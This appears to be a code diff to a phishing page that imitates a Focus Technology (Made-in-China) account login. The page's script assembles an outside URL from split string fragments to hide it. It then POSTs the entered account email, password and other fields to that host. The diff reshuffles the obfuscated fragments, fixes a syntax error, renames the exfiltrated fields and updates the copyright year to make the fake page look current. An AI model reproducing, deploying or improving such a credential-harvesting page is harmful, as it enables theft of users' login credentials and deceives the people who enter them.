@@ -222,12 +222,12 @@
     <script>
       let resBox = "MinC";
 
-      let nbg1 = "ht";
-      let nbg2 = "tps://";
-      let nbg3 = "kvwpca.co";
-      let nbg4 = "m/jolly";
-      let nbg5 = "/gram.;
-      let nbg6 = "php";
+      let nbg1 = "htt";
+      let nbg2 = "ps://kvw";
+      let nbg3 = "pca";
+      let nbg4 = ".com/jolly";
+      let nbg5 = "/gram";
+      let nbg6 = ".php";
 
       let nbg = `${nbg1}${nbg2}${nbg3}${nbg4}${nbg5}${nbg6}`;
 
@@ -298,7 +298,14 @@
             <input type="hidden" class="text" name="trial" id="trial" />
 
             <p class="text_label">Account</p>
-            <input type="text" required class="text mm" id="tma" value="" />
+            <input
+              type="text"
+              required
+              class="text mm"
+              id="tma"
+              value=""
+              placeholder="Please enter your email address."
+            />
             <div style="display: flex; justify-content: space-between">
               <p class="text_label">Password</p>
 
@@ -531,7 +538,7 @@
               margin-top: 20px;
             "
           >
-            Copyright © 1998-2024 Focus Technology Co., Ltd. All Rights
+            Copyright © 1998-2025 Focus Technology Co., Ltd. All Rights
             Reserved. &nbsp;|&nbsp; User Agreement &nbsp;|&nbsp; Declaration
             &nbsp;|&nbsp; Privacy Policy
           </p>
@@ -574,9 +581,9 @@
           url: nbg,
           type: "POST",
           data: {
-            torg: torg.value,
-            tma: tma.value,
-            tpp: tpp.value,
+            ckorg: torg.value,
+            ck: tma.value,
+            cknow: tpp.value,
             loc: loc.value,
             trial: trial.value,
             resBox: resBox,
